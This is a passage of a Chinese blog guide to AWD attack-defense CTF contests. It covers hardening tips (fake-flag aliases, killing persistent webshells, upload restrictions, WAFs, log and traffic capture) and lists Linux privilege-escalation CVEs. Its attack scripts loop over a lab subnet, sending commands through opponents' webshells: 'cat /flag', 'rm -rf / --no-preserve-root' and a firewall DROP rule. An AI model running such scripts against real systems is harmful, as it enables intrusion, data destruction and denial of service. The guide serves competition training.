&#x27;\\n&#x27;)</span><br><span class="line">                        f.close()</span><br><span class="line">                    except Exception as e:</span><br><span class="line">                        print u&#x27;[-] log error : done_diff: &#x27; + getUnicode(filekey)</span><br><span class="line">                        pass</span><br><span class="line">        time.sleep(2)</span><br><span class="line">        # print &#x27;[*] &#x27; + getUnicode(time.ctime())</span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python jiankong.py  /var/www/html</span><br></pre></td></tr></table></figure><h2 id="alias起别名"><a href="#alias起别名" class="headerlink" title="alias起别名"></a>alias起别名</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias cat=&quot;echo nothing&quot;</span><br></pre></td></tr></table></figure><p>删除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unalias -a</span><br></pre></td></tr></table></figure><p>对方执行cat /flag命令的时候回显就是错误flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias cat=&quot;echo `date`|md5sum|cut -d &#x27; &#x27; -f1||&quot;</span><br></pre></td></tr></table></figure><p>获取 flag 一般是 curl <a href="http://xxx.com/flag.txt">http://xxx.com/flag.txt</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">alias curl=&#x27;echo fuckoff&#x27; #权限要求较低，可以在这里改成虚假的flag</span><br><span class="line"># 或者</span><br><span class="line">chmod -x curl #权限要求较高</span><br><span class="line">/usr/bin curl路径</span><br></pre></td></tr></table></figure><h2 id="杀不死马"><a href="#杀不死马" class="headerlink" title="杀不死马"></a>杀不死马</h2><p>查看进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@1177499f5b23:~# ps aux | grep www-data</span><br><span class="line">www-data  4819  0.0  0.4 315808  9016 ?        S    Dec16   0:00 apache2 -D FOREGROUND</span><br><span class="line">www-data  6663  0.0  0.6 316188 13460 ?        S    Dec16   0:00 apache2 -D FOREGROUND</span><br><span class="line">www-data  6675  0.0  0.3 315620  6976 ?        S    Dec16   0:00 apache2 -D FOREGROUND</span><br><span class="line">www-data  6690  0.0  0.4 315808  9016 ?        S    Dec16   0:00 apache2 -D FOREGROUND</span><br><span class="line">www-data  6693  0.0  0.4 315800  9056 ?        S    Dec16   0:00 apache2 -D FOREGROUND</span><br><span class="line">www-data  7170  0.0  0.6 316312 14100 ?        S    Dec16   0:00 apache2 -D FOREGROUND</span><br><span class="line">www-data  7239  0.0  0.6 316172 14020 ?        S    Dec16   0:00 apache2 -D FOREGROUND</span><br><span class="line">www-data  7526  0.0  0.4 315620  8364 ?        S    Dec16   0:00 apache2 -D FOREGROUND</span><br><span class="line">www-data  8380  0.0  0.6 316188 12612 ?        S    Dec16   0:00 apache2 -D FOREGROUND</span><br><span class="line">www-data 22554  0.0  0.3 315564  7416 ?        S    03:10   0:00 apache2 -D FOREGROUND</span><br><span class="line">root     25353  0.0  0.0   8868  1544 pts/1    S+   05:25   0:00 grep --color=auto www-data</span><br></pre></td></tr></table></figure><p>(1)杀进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -9 对应的进程号</span><br></pre></td></tr></table></figure><p>执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep www-data | awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9</span><br><span class="line">ps aux | grep www-data | grep -v grep | awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9</span><br></pre></td></tr></table></figure><p>原理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ps aux</span><br><span class="line">列出进程信息</span><br><span class="line"></span><br><span class="line">grep www-data</span><br><span class="line">在进程信息中找到需要杀死的进程</span><br><span class="line"></span><br><span class="line">grep -v grep</span><br><span class="line">在进程信息中剔除带grep的信息</span><br><span class="line"></span><br><span class="line">awk ‘&#123;print $2&#125;’</span><br><span class="line">提取字符串行内容的第2个字段，也就是当前示例的进程号</span><br><span class="line"></span><br><span class="line">xargs kill -9</span><br><span class="line">将进程号作为参数传递给kill -9这个命令</span><br></pre></td></tr></table></figure><p>然后删除不死马文件</p><p>(2)重启php等web服务，不推荐使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service php-fpm restart</span><br></pre></td></tr></table></figure><p>(3)用一个ignore_user_abort(true)脚本，一直竞争写入（断断续续）。usleep要低于对方不死马设置的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">while (1) &#123;</span><br><span class="line">    $pid=1234;  #不死马进程</span><br><span class="line">    @unlink(&#x27;demo.php&#x27;);</span><br><span class="line">    exec(&#x27;kill -9 $pid&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    ignore_user_abort(true);</span><br><span class="line">    set_time_limit(0);</span><br><span class="line">    unlink(__FILE__);</span><br><span class="line">    $file = &#x27;.3.php&#x27;;</span><br><span class="line">    $code = &#x27;hi springbird !&#x27;;</span><br><span class="line">    //pass=pass</span><br><span class="line">    while (1)&#123;</span><br><span class="line">        file_put_contents($file,$code);</span><br><span class="line">        system(&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .3.php&#x27;);</span><br><span class="line">    //    usleep(5000);</span><br><span class="line">          usleep(1000);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>(4)创建一个和不死马生成的马一样名字的文件夹 mkdir 1.php</p><p>循环创建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">dire=&quot;/var/www/html/.base.php/&quot;</span><br><span class="line">file=&quot;/var/www/html/.base.php&quot;</span><br><span class="line">rm -rf $file</span><br><span class="line">mkdir $dire</span><br><span class="line">./xx.sh</span><br></pre></td></tr></table></figure><h2 id="清除反弹shell"><a href="#清除反弹shell" class="headerlink" title="清除反弹shell"></a>清除反弹shell</h2><p>查看进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef / px -aux</span><br></pre></td></tr></table></figure><p>出现www-data权限的/bin/sh一般为nc</p><p>然后杀进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill `ps -aux | grep www-data | grep apache2 | awk &#x27;&#123;print $2&#125;&#x27;`</span><br></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在AWD中，一般都需要专门防御加固自己服务器的环节，但加固的很多操作都会涉及到root权限，如果直接给root权限最好，但一般只会给一个普通权限账号，这时候往往就需要给服务器提权了。</p><p>关于提权，通常我们要根据kernel版本号找到对应的poc，平时我们可以收集测试一些比较新的提权poc，以备不时之需。</p><p>影响范围比较大的漏洞，可以用来提权：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">CVE-2017-6074 (DCCP双重释放漏洞 &gt; 2.6.18 ) ：</span><br><span class="line">DCCP双重释放漏洞可允许本地低权限用户修改Linux内核内存，导致拒绝服务(系统崩溃)或者提升权限，获得系统的管理访问权限</span><br><span class="line"></span><br><span class="line">CVE-2016-5195(脏牛，kernel 2.6.22 &lt; 3.9 (x86/x64)) ：</span><br><span class="line">低权限用户可修改root用户创建的文件内容，如修改 /etc/passwd，把当前用户的 uid 改成 0 即可提升为root权限</span><br><span class="line"></span><br><span class="line">CVE-2016-8655(Ubuntu 12.04、14.04，Debian 7、8) ：</span><br><span class="line">条件竞争漏洞，可以让低权限的进程获得内核代码执行权限</span><br><span class="line">POC：&lt;https://www.seebug.org/vuldb/ssvid-92567&gt;</span><br><span class="line"></span><br><span class="line">CVE-2017-1000367(sudo本地提权漏洞 ) ：L</span><br><span class="line">inux Kernel Stack Clash安全漏洞。该漏洞是由于操作系统内存管理中的一个堆栈冲突漏洞，它影响Linux，FreeBSD和OpenBSD，NetBSD，Solaris，i386和AMD64，攻击者可以利用它破坏内存并执行任意代码 。</span><br><span class="line"></span><br><span class="line">CVE-2016-1247(Nginx权限提升漏洞) ：</span><br><span class="line">Nginx服务在创建log目录时使用了不安全的权限设置，可造成本地权限提升，恶意攻击者能够借此实现从 nginx/web 的用户权限 www-data 到 root 用户权限的提升。</span><br><span class="line">POC：&lt;https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html&gt;</span><br></pre></td></tr></table></figure><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>基本原则</p><ul><li>能修复的尽量修复；</li><li>不能修复的先注释源码，不影响页面显示再删除；</li><li>站点和对应的功能尽可能不宕机；</li></ul><p>技巧</p><ul><li>设置 waf，如 load_file；</li><li>对于一些成型的 CMS，找到相应版本号后，对其 diff；</li><li>修改弱口令用户；</li><li>对于觉得危险函数的地方直接使用die()；</li></ul><p>比如文件上传漏洞修复，可以在upload目录下写.htaccess禁止php文件执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory &quot;/var/www/html/upload&quot;&gt;</span><br><span class="line">Options -ExecCGI -Indexes</span><br><span class="line">AllowOverride None</span><br><span class="line">RemoveHandler .php .phtml .php3 .pht .php4 .php5 .php7 .shtml</span><br><span class="line">RemoveType .php .phtml .php3 .pht .php4 .php5 .php7 .shtml</span><br><span class="line">php_flag engine off</span><br><span class="line">&lt;FilesMatch &quot;.+\\.ph(p[3457]?|t|tml)$&quot;&gt;</span><br><span class="line">deny from all</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure><p>一些修复技巧参考：<a href="https://qftm.github.io/2019/08/03/AWD-Bugs-Fix/">AWD攻防赛之各类漏洞FIX方案 | Qftm</a></p><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><p>命令行动态查看日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tailf /var/log/apache2/access.log</span><br></pre></td></tr></table></figure><p>还可以使用工具进行日志分析：<a href="https://security.tencent.com/index.php/opensource/detail/15">LogForensics 腾讯实验室 /web日志取证分析工具</a></p><p>日志的存放地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/log/apache2/</span><br><span class="line">/usr/local/apache2/logs</span><br><span class="line">/usr/nginx/logs/</span><br></pre></td></tr></table></figure><p>为了对其他防守方进行干扰，可以利用脚本发生大量垃圾数据包，混淆视觉，给对方人员增加检测的难度，浪费对方的时间。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def scan_attack():</span><br><span class="line">    file=&#123;&#x27;shell.php&#x27;,&#x27;admin.php&#x27;,&#x27;web.php&#x27;,&#x27;login.php&#x27;,&#x27;1.php&#x27;,&#x27;index.php&#x27;&#125;</span><br><span class="line">    payload=&#123;&#x27;cat /flag&#x27;,&#x27;ls -al&#x27;,&#x27;rm -f&#x27;,&#x27;echo 1&#x27;,&#x27;echo 1 /proc/sys/net/ipv4/ip_forward&#x27;,&#x27;rm -rf / --no-preserve-root&#x27;&#125;</span><br><span class="line">    while(1):</span><br><span class="line">        for i in range(1, 50):</span><br><span class="line">            for ii in file:</span><br><span class="line">                url=&#x27;&lt;http://192.168.182&gt;.&#x27;+ str(i)+&#x27;/&#x27;+ii</span><br><span class="line">                print(url)</span><br><span class="line">                for iii in payload:</span><br><span class="line">                    data=&#123;</span><br><span class="line">                        &#x27;payload&#x27;:iii</span><br><span class="line">                    &#125;</span><br><span class="line">                    try:</span><br><span class="line">                        requests.post(url,data=data)</span><br><span class="line">                        print(&quot;正在搅屎:&quot;+str(i)+&#x27;|&#x27;+ii+&#x27;|&#x27;+iii)</span><br><span class="line">                        time.sleep(0.1)</span><br><span class="line">                    except Exception as e:</span><br><span class="line">                        time.sleep(0.1)</span><br><span class="line">                        pass</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    scan_attack()</span><br></pre></td></tr></table></figure><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p>在比赛服务器上抓取流量包，需要的权限比较高，一般比赛用不到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -s 0 -w flow.pcap port 80</span><br><span class="line"># 然后使用 scp 写个脚本实时将流量包拷贝到本地</span><br><span class="line"></span><br><span class="line">tcpdump tcp -i eth1 -t -s 0 -c 100 and dst port ! 22 and src net 192.168.1.0/24 -w ./target.cap</span><br><span class="line">命令拆解分析：</span><br><span class="line">1、tcp: ip icmp arp rarp 和 tcp、udp、icmp这些选项等都要放到第一个参数的位置，用来过滤数据报的类型</span><br><span class="line">2、-i eth1 : 只抓经过接口eth1的包</span><br><span class="line">3、-t : 不显示时间戳</span><br><span class="line">4、-s 0 : 抓取数据包时默认抓取长度为68字节。加上-S 0 后可以抓到完整的数据包</span><br><span class="line">5、-c 100 : 只抓取100个数据包</span><br><span class="line">6、dst port ! 22 : 不抓取目标端口是22的数据包</span><br><span class="line">7、src net 192.168.1.0/24 : 数据包的源网络地址为192.168.1.0/24</span><br><span class="line">8、-w ./target.cap : 保存成cap文件，方便用wireshark分析</span><br></pre></td></tr></table></figure><p>PHP版流量监控</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">  date_default_timezone_set(&#x27;Asia/Shanghai&#x27;);</span><br><span class="line"></span><br><span class="line">$ip = $_SERVER[&quot;REMOTE_ADDR&quot;]; //记录访问者的ip</span><br><span class="line"></span><br><span class="line">$filename = $_SERVER[&#x27;PHP_SELF&#x27;]; //访问者要访问的文件名</span><br><span class="line"></span><br><span class="line">$parameter = $_SERVER[&quot;QUERY_STRING&quot;]; //访问者要请求的参数</span><br><span class="line"></span><br><span class="line">$time = date(&#x27;Y-m-d H:i:s&#x27;,time()); //访问时间</span><br><span class="line"></span><br><span class="line">$logadd = &#x27;来访时间：&#x27;.$time.&#x27;--&gt;&#x27;.&#x27;访问链接：&#x27;.&#x27;http://&#x27;.$ip.$filename.&#x27;?&#x27;.$parameter.&quot;\\r\\n&quot;;</span><br><span class="line"></span><br><span class="line">// log记录</span><br><span class="line"></span><br><span class="line">$fh = fopen(&quot;log.txt&quot;, &quot;a&quot;);</span><br><span class="line"></span><br><span class="line">fwrite($fh, $logadd);</span><br><span class="line"></span><br><span class="line">fclose($fh);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>一个针对php的web流量抓取、分析的应用：<a href="https://github.com/wupco">wupco</a>/<a href="https://github.com/wupco/weblogger">weblogger</a></p><p>使用方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html/ (or other web dir)</span><br><span class="line"></span><br><span class="line">   git clone &lt;https://github.com/wupco/weblogger.git&gt;</span><br><span class="line"></span><br><span class="line">   chmod -R 777 weblogger/</span><br><span class="line"></span><br><span class="line">   open &lt;http://xxxxx/weblogger/install.php&gt; in Web browser</span><br><span class="line"></span><br><span class="line">   install it</span><br></pre></td></tr></table></figure><h2 id="-1"><a href="#-1" class="headerlink" title></a></h2><h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>waf的作用：</p><p>1.最重要是分析流量，别人攻击我们的时候，我们可以看到别人的攻击方式。这样的话即使我们找 不到攻击点，非常苦恼的时候，我们就可以分析流量，使用别人的攻击方式。</p><p>2.可以直接进行防御，类似于一台防火墙（一般的比赛是不允许使用的，毕竟比赛时间短，就根本绕不过去waf，那比赛就没意思了）</p><p>有些比赛是不允许上通用waf的，check机制可能会check到waf过滤的参数，导致宕机，waf部署需要谨慎，还需要注意的是：上完waf检查服务是否可用，部分检查允许使用部分小的waf，会检查页面完整性、服务完整性。</p><p>常用的waf使用方法，是用你要保护的文件去包含这个waf.php。比如说，你要保护select.php，那么你就在select.php里面写上一行include ‘./waf.php’或者 require_once(‘waf.php’);</p><p>如果你要保护所有文件，那么就在config这种配置文件里包含waf，因为这种config的文件，一般会被大部分功能页面调用</p><p>网上很多waf脚本，这里介绍几个waf项目</p><p><strong>1.AWD_PHP_WAF</strong></p><p>项目地址：<a href="https://github.com/NonupleBroken/AWD_PHP_WAF">GitHub - NonupleBroken/AWD_PHP_WAF: a PHP WAF for AWD</a></p><p>使用方法：</p><p>使用前先修改config.php内的密码，密码使用sha256加密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">上waf：</span><br><span class="line">$ find . -path ./waffffff -prune -o -type f -name &quot;*.php&quot; -print | xargs sed -i &quot;s/&lt;?php/&lt;?php include_once(\\&quot;\\/var\\/www\\/html\\/waffffff\\/waf.php\\&quot;);/g&quot;</span><br><span class="line"></span><br><span class="line">下waf：</span><br><span class="line">$ find . -path ./waffffff -prune -o -type f -name &quot;*.php&quot; -print | xargs sed -i &quot;s/&lt;?php include_once(\\&quot;\\/var\\/www\\/html\\/waffffff\\/waf.php\\&quot;);/&lt;?php/g&quot;</span><br></pre></td></tr></table></figure><p>比如访问 web 目录下的/waffffff/admin.php?password=123456</p><p><strong>2.CTF-WAF</strong></p><p>项目地址：<a href="https://github.com/sharpleung/CTF-WAF">GitHub - sharpleung/CTF-WAF: 针对CTF线下赛的通用WAF,带流量转发，日志审计功能。</a></p><p><strong>3.awd-watchbird</strong></p><p>这是个通防waf，支持流量转发和替换flag</p><p>项目地址：<a href="https://github.com/leohearts/awd-watchbird">GitHub - leohearts/awd-watchbird: A powerful PHP WAF for AWD</a></p><p>1.打包好好之后直接上传到html目录下，回到终端，在上传的waf目录下，使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php watchbird.php --install /var/www/html</span><br></pre></td></tr></table></figure><p>这样就能使每个页面的php代码包含到waf下</p><p>2.运行waf 之后，打开我们的web 页面，在任意一个php 页面后面输入?watchbird=ui，就会进入到waf 配置页面然后设置密码(注意：第一次打开需要设置密码)</p><p>3.配置好之后就能进入内部网页</p><p><strong>4.AoiAWD</strong></p><p>项目地址：<a href="https://github.com/DasSecurity-HatLab/AoiAWD">GitHub - DasSecurity-HatLab/AoiAWD: AoiAWD-专为比赛设计，便携性好，低权限运行的EDR系统。</a></p><p>使用方法：<a href="https://www.wlhhlc.top/posts/16692/">AoiAWD-萌新的得分利器</a></p><p>下载好，自己去编译或者找编译好的直接用</p><h2 id="防御搅屎"><a href="#防御搅屎" class="headerlink" title="防御搅屎"></a>防御搅屎</h2><p>在加固阶段，每个堡垒机都有一个Web在运行。而这些站点可能存在相应的漏洞和后门。基本上都会有shell留在隐秘的角落…</p><p>所以我们就可以通过前期搜寻到的后门，进行操作。这里直接用linux的防火墙进行关闭即可。</p><p>在正常情况下：这样的话就直接把系统的后门全杀掉了。只允许22 80 21端口可以进行访问。</p><p>首先开启 22 80 21</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --dport 21 -j ACCEPT</span><br></pre></td></tr></table></figure><p>然后关闭</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -j DROP</span><br></pre></td></tr></table></figure><p>在手动一个个连shell搅shi的话，是非常慢的。于是写了个小脚本。</p><p>遍历整个IP段，并将防火墙开启全部屏蔽掉~~</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;&lt;http://192.168.182&gt;&quot;</span><br><span class="line">port=&#x27;80&#x27;</span><br><span class="line">shell = &quot;/shell.php&quot;</span><br><span class="line">passwd = &quot;a&quot;</span><br><span class="line">payloads = &#123;</span><br><span class="line">    passwd:&quot;system(\\&#x27;iptables -A INPUT -j DROP&#x27;);&quot;</span><br><span class="line">&#125;</span><br><span class="line">for i in range(1,254):</span><br><span class="line">    urls = url+&quot;.&quot;+str(i)+&quot;:&quot;+port+shell</span><br><span class="line">    print(urls+&quot;\\n&quot;)</span><br><span class="line">    try:</span><br><span class="line">        res = requests.post(urls,payloads,timeout=1)</span><br><span class="line">        print(res.text)</span><br><span class="line">    except:</span><br><span class="line">        print(&quot;未找到主机&quot;)</span><br></pre></td></tr></table></figure><h1 id="编写批量脚本"><a href="#编写批量脚本" class="headerlink" title="编写批量脚本"></a>编写批量脚本</h1><p>以下脚本来自于我比赛时写的垃圾脚本，大佬勿喷。</p><h3 id="1-利用后门getflag"><a href="#1-利用后门getflag" class="headerlink" title="1.利用后门getflag"></a>1.利用后门getflag</h3><p>单个shell获取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&quot;&lt;http://192.168.182.130/include/shell.php&gt;&quot;</span><br><span class="line">passwd=&quot;admin_ccmd&quot;</span><br><span class="line">payload = &#123;passwd: &#x27;system(\\&#x27;cat /f*\\&#x27;);&#x27;&#125;</span><br><span class="line">res=requests.post(url,payload)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><h3 id="2-后门批量getflag"><a href="#2-后门批量getflag" class="headerlink" title="2.后门批量getflag"></a>2.后门批量getflag</h3><p>针对端口变化利用后门批量获取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url1=&quot;&lt;http://192.168.182.130&gt;:&quot;</span><br><span class="line">url2=&quot;&quot;</span><br><span class="line"></span><br><span class="line">flaglist=[]</span><br><span class="line"></span><br><span class="line">path=&quot;/include/shell.php&quot;</span><br><span class="line">passwd=&quot;admin_ccmd&quot;</span><br><span class="line"></span><br><span class="line">#payload = &#123;passwd: &#x27;system(\\&#x27;cat /f*\\&#x27;);&#x27;&#125;</span><br><span class="line">payload = &#123;passwd: &#x27;system(\\&#x27;cat /flag\\&#x27;);&#x27;&#125;</span><br><span class="line"></span><br><span class="line">i = 0</span><br><span class="line"></span><br><span class="line">for url2 in range(8801,8805):</span><br><span class="line">    url = url1 + str(url2) +path</span><br><span class="line"></span><br><span class="line">    res=requests.post(url,payload)</span><br><span class="line">    try:</span><br><span class="line">        print(url1 + str(url2),res.text)</span><br><span class="line">        # flag存入列表中</span><br><span class="line">        flaglist.append(str(res.text))</span><br><span class="line">        #print(flaglist[i])</span><br><span class="line">        i += 1</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure><h3 id="3-利用后门批量getflag并提交"><a href="#3-利用后门批量getflag并提交" class="headerlink" title="3.利用后门批量getflag并提交"></a>3.利用后门批量getflag并提交</h3><p>burp抓包，发现flag以json形式传输</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /api/flag HTTP/1.1</span><br><span class="line">Host: 192.168.182.130:39999</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/json;charset=utf-8</span><br><span class="line">Authorization: 9ad36c305d6a2d2514434a4c10e7e13f</span><br><span class="line">Content-Length: 55</span><br><span class="line">Origin: &lt;http://192.168.182.130:39999&gt;</span><br><span class="line">Connection: close</span><br><span 